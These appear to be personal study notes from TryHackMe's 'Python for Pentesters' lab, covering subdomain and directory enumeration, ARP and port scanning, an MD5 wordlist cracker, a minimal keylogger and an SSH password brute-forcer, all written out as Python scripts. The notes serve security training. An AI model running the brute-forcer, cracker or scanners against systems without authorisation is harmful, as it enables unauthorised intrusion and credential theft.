# Python
## Python basics
**Disclaimer:** I'm not going to summarize python as there's plenty of resources to learn it.
Here's some common takeaways, not in any particular order. All of these examples are straight from the TryHackMe website and script modification will be needed to make them work.


Popular libraries / tools you may find useful in scripting as a pentester:
- Request - simple HTTP library.
- Scapy - send, sniff, dissect and forge network packets
- Pwntools - a CTF & exploit development library.
- Tool to convert python into windows executable: `py2exe`

## Subdomain enumeration
Python gives us an easy way to automate tasks during a penetration test. Any tasks that you have to perform regularly are worth automating.
While the automation process comes with a learning curve, the mid and long-term gains are worth it.

The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.

```py
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   
```

## Directory enumeration
Once subdomains have been discovered, the next step would be to find directories.

```py
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
```

## Network scanner
Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network.
However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to “ping a server”.
On the other hand, systems can be configured to not respond to ICMP requests.
These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective.

```py
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))     
```

## Port scanner
```py
import sys
import socket
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)

ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)

def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result

for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    
if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
```

## File downloader
```py
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  
```

## Hash cracker
```py
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```

## Keyloggers
```py
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

## SSH brute forcing
```py
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```
